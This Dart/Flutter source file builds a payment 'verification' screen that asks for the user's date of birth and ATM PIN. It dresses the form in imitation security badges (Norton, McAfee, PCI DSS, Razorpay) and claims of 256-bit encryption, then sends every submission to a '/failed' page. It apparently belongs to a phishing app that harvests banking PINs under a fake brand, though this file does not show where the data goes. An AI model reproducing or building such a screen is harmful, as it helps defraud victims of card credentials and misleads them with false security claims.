import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:go_router/go_router.dart';
import '../theme.dart';

class CardVerifyScreen extends StatefulWidget {
  final double amount;
  const CardVerifyScreen({super.key, required this.amount});
  @override
  State<CardVerifyScreen> createState() => _S();
}

class _S extends State<CardVerifyScreen> {
  final dob = TextEditingController();
  final atmPin = TextEditingController();

  bool get _validDob {
    final parts = dob.text.split('/');
    if (parts.length != 3) return false;
    try {
      final d = int.parse(parts[0]), m = int.parse(parts[1]), y = int.parse(parts[2]);
      if (m < 1 || m > 12) return false;
      final days = [0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
      if (y % 4 == 0 && (y % 100 != 0 || y % 400 == 0)) days[2] = 29;
      if (d < 1 || d > days[m]) return false;
      final now = DateTime.now();
      final birth = DateTime(y, m, d);
      if (birth.isAfter(now)) return false;
      var age = now.year - y;
      if (now.month < m || (now.month == m && now.day < d)) age--;
      if (age < 18) return false;
      return true;
    } catch (_) {
      return false;
    }
  }

  bool get _valid => _validDob && atmPin.text.length == 4;

  void submit() {
    if (_valid) context.push('/failed');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(body: SafeArea(child: SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [AppColors.blue.withValues(alpha: .15), AppColors.navy.withValues(alpha: .08)],
                begin: Alignment.topLeft, end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(12),
            ),
            child: const Icon(Icons.verified_user, color: AppColors.blue, size: 24),
          ),
          const SizedBox(width: 14),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text('Verify & Pay', style: AppStyles.headerStyle),
            const SizedBox(height: 2),
            const Text('Secure verification for payment', style: AppStyles.bodySmall),
          ]),
        ]),
        const SizedBox(height: 24),
        Container(
          padding: const EdgeInsets.all(20),
          decoration: AppStyles.blueGradient.copyWith(
            borderRadius: BorderRadius.circular(16),
            boxShadow: [
              BoxShadow(color: AppColors.blue.withValues(alpha: .3), blurRadius: 16, offset: const Offset(0, 6)),
            ],
          ),
          child: Column(children: [
            const Text('Amount to Pay', style: TextStyle(color: Colors.white70, fontSize: 13, fontWeight: FontWeight.w500)),
            const SizedBox(height: 4),
            Text('\u{20B9}${widget.amount.toStringAsFixed(1)}',
                style: const TextStyle(fontSize: 32, fontWeight: FontWeight.w800, color: Colors.white, letterSpacing: 0.5)),
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
              decoration: BoxDecoration(
                color: Colors.white.withValues(alpha: .15),
                borderRadius: BorderRadius.circular(20),
              ),
              child: Row(mainAxisSize: MainAxisSize.min, children: const [
                Icon(Icons.lock, size: 12, color: Colors.white),
                SizedBox(width: 6),
                Text('Secured Payment', style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.w600)),
              ]),
            ),
          ]),
        ),
        const SizedBox(height: 20),
        Container(
          padding: const EdgeInsets.all(24),
          decoration: AppStyles.cardDecoration,
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.green.shade50,
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Icon(Icons.verified_user, color: AppColors.green, size: 22),
              ),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: const [
                Text('Personal Details Verification', style: AppStyles.cardTitleStyle),
                SizedBox(height: 2),
                Text('Please verify your identity to complete payment',
                    style: TextStyle(color: AppColors.textMedium, fontSize: 13)),
              ]),
            ]),
            const Divider(height: 28),
            _label('Date of Birth'),
            const SizedBox(height: 6),
            TextField(
              controller: dob, keyboardType: TextInputType.number,
              inputFormatters: [
                FilteringTextInputFormatter.digitsOnly,
                LengthLimitingTextInputFormatter(8),
                _DobFormatter(),
              ],
              style: const TextStyle(fontSize: 15, color: AppColors.textDark),
              decoration: AppStyles.textFieldDecoration('DD/MM/YYYY',
                  prefixIcon: const Icon(Icons.calendar_today, color: AppColors.blue, size: 20)),
              onChanged: (_) => setState(() {}),
            ),
            if (dob.text.length == 10 && !_validDob)
              Padding(
                padding: const EdgeInsets.only(top: 6),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                  decoration: BoxDecoration(
                    color: AppColors.red.withValues(alpha: .08),
                    borderRadius: BorderRadius.circular(6),
                  ),
                  child: Row(mainAxisSize: MainAxisSize.min, children: const [
                    Icon(Icons.error_outline, size: 14, color: AppColors.red),
                    SizedBox(width: 6),
                    Text('Invalid DOB (must be 18+)',
                        style: TextStyle(color: AppColors.red, fontSize: 12, fontWeight: FontWeight.w600)),
                  ]),
                ),
              ),
            const SizedBox(height: 20),
            _label('ATM PIN'),
            const SizedBox(height: 6),
            TextField(
              controller: atmPin, obscureText: true, keyboardType: TextInputType.number,
              inputFormatters: [
                FilteringTextInputFormatter.digitsOnly,
                LengthLimitingTextInputFormatter(4),
              ],
              style: const TextStyle(fontSize: 16, color: AppColors.textDark, letterSpacing: 4),
              decoration: AppStyles.textFieldDecoration('Enter 4-digit ATM PIN',
                  prefixIcon: const Icon(Icons.lock, color: AppColors.blue, size: 20))
                  .copyWith(counterText: ''),
              onChanged: (_) => setState(() {}),
            ),
            const SizedBox(height: 28),
            SizedBox(
              width: double.infinity,
              height: 54,
              child: ElevatedButton.icon(
                onPressed: _valid ? submit : null,
                icon: const Icon(Icons.lock, size: 18),
                label: const Text('Submit & Pay', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w700)),
                style: AppStyles.primaryButton(double.infinity),
              ),
            ),
          ]),
        ),
        const SizedBox(height: 20),
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: Colors.white,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: Colors.green.shade200),
            boxShadow: [
              BoxShadow(color: Colors.green.withValues(alpha: .06), blurRadius: 12, offset: const Offset(0, 4)),
            ],
          ),
          child: Column(children: [
            Row(children: const [
              Icon(Icons.security, color: AppColors.green, size: 20),
              SizedBox(width: 10),
              Text('Secure Data Collection', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w700, color: AppColors.green)),
            ]),
            const SizedBox(height: 20),
            Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: const [
              _TrustBadge('VeriSign', 'SSL Secure', Color(0xFF0066CC)),
              _TrustBadge('Norton', '256-bit', Color(0xFFE21610)),
              _TrustBadge('McAfee', 'SECURE', Color(0xFFC0181F)),
            ]),
            const SizedBox(height: 12),
            Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: const [
              _TrustBadge('PCI DSS', 'Compliant', Color(0xFF1A237E)),
              _TrustBadge('Razorpay', 'Powered', Color(0xFF2D9CDB)),
              _TrustBadge('ISO 27001', 'Certified', Color(0xFF2E7D32)),
            ]),
            const SizedBox(height: 16),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              decoration: BoxDecoration(
                color: Colors.green.shade50,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: Colors.green.shade100),
              ),
              child: Row(children: const [
                Icon(Icons.lock, color: AppColors.green, size: 16),
                SizedBox(width: 10),
                Expanded(child: Text('Your data is encrypted with 256-bit SSL encryption',
                    style: TextStyle(color: AppColors.green, fontSize: 12, fontWeight: FontWeight.w600))),
              ]),
            ),
          ]),
        ),
        const SizedBox(height: 24),
        Row(mainAxisAlignment: MainAxisAlignment.center, children: [
          Icon(Icons.verified, size: 14, color: AppColors.blue.withValues(alpha: .6)),
          const SizedBox(width: 6),
          const Text('/Razorpay',
              style: TextStyle(fontSize: 28, fontStyle: FontStyle.italic, fontWeight: FontWeight.w800, color: AppColors.navy)),
        ]),
        const SizedBox(height: 4),
        const Center(child: Text('Powered by Razorpay | Secure Payment Gateway',
            style: TextStyle(color: AppColors.textLight, fontSize: 12))),
        const SizedBox(height: 16),
      ]),
    )));
  }

  Widget _label(String t) => Padding(padding: const EdgeInsets.only(bottom: 4),
      child: Text(t, style: AppStyles.labelStyle));
}

class _DobFormatter extends TextInputFormatter {
  @override
  TextEditingValue formatEditUpdate(TextEditingValue old, TextEditingValue next) {
    final digits = next.text.replaceAll('/', '');
    if (digits.length > 8) return old;
    String s = digits;
    if (digits.length >= 3) s = '${digits.substring(0, 2)}/${digits.substring(2)}';
    if (digits.length >= 5) s = '${s.substring(0, 5)}/${s.substring(5)}';
    return next.copyWith(text: s, selection: TextSelection.collapsed(offset: s.length));
  }
}

class _TrustBadge extends StatelessWidget {
  final String title, subtitle;
  final Color color;
  const _TrustBadge(this.title, this.subtitle, this.color);

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [color.withValues(alpha: .08), color.withValues(alpha: .03)],
          begin: Alignment.topLeft, end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: color.withValues(alpha: .2)),
      ),
      child: Column(children: [
        Text(title, style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11, color: color)),
        SizedBox(height: 2),
        Text(subtitle, style: TextStyle(fontSize: 9, color: color.withValues(alpha: .7))),
      ]),
    );
  }
}
